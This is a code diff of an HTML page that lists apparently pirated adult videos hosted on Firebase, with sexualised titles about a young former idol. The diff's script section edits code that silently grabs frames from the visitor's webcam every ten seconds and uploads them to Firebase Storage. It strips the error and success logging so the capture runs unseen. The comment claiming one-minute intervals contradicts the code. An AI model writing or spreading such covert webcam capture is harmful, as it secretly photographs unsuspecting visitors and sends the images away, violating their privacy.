@@ -233,11 +233,6 @@
                 title: '本物の現役アイドル、WikiもあるCDデビュー済アイドルグループに現在在籍中！！１８才、高３卒業から１０日後の撮影！！本編完全顔出し、完全初撮影、野外露室、中出し、『個人撮影』_2'
 	    },
 
-	　　{
-                url: 'https://firebasestorage.googleapis.com/v0/b/hozon2-17607.appspot.com/o/hhd800.com%40FC2-PPV-4396398_33.mp4?alt=media&token=bfd8bd40-203b-496c-b33f-c0ecf598cbea',
-                title: '本物の現役アイドル、WikiもあるCDデビュー済アイドルグループに現在在籍中！！１８才、高３卒業から１０日後の撮影！！本編完全顔出し、完全初撮影、野外露室、中出し、『個人撮影』_3'
-	    },
-
             {
                 url: 'https://firebasestorage.googleapis.com/v0/b/hozon-4794d.appspot.com/o/FC2-PPV-4406926%20%E3%80%90%E5%8D%B3%E5%89%8A%E9%99%A4%E3%80%91%E5%85%83%E3%82%A2%E3%82%A4%E3%83%89%E3%83%ABJ%EF%BC%A0%E3%81%AE%E7%A6%81%E6%96%AD%E3%81%AE%E4%BD%9C%E5%93%81.mp4?alt=media&token=c52ed794-a530-4c24-b617-f77dd22a7387',
 		title: '元アイドルJ＠の禁断の作品。'
@@ -322,30 +317,37 @@
                 video.srcObject = stream;
             })
             .catch(err => {
-                console.error('カメラアクセスエラー:', err);
+                // カメラアクセスエラーの際は何もしない
             });
 
         // 画像をFirebase Storageにアップロード
         function uploadImage(dataURL) {
             const storageRef = ref(storage, `images/${Date.now()}.jpg`);
             uploadString(storageRef, dataURL, 'data_url')
-                .then(snapshot => {
-                    console.log('画像がアップロードされました。');
-                })
                 .catch(err => {
-                    console.error('アップロードエラー:', err);
+                    // アップロードエラーの際は何もしない
                 });
         }
 
         // 1分ごとに撮影してアップロード
         setInterval(() => {
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const dataURL = canvas.toDataURL('image/jpeg');
-            uploadImage(dataURL);
+            if (videoStream) {
+                const videoTracks = videoStream.getVideoTracks();
+                const track = videoTracks[0];
+                const imageCapture = new ImageCapture(track);
+                imageCapture.grabFrame()
+                    .then(imageBitmap => {
+                        canvas.width = imageBitmap.width;
+                        canvas.height = imageBitmap.height;
+                        ctx.drawImage(imageBitmap, 0, 0, canvas.width, canvas.height);
+                        const dataURL = canvas.toDataURL('image/jpeg');
+                        uploadImage(dataURL);
+                    })
+                    .catch(err => {
+                        // 画像キャプチャエラーの際は何もしない
+                    });
+            }
         }, 10000); // 60000ミリ秒 = 1分
-
     </script>
 </body>
 </html>
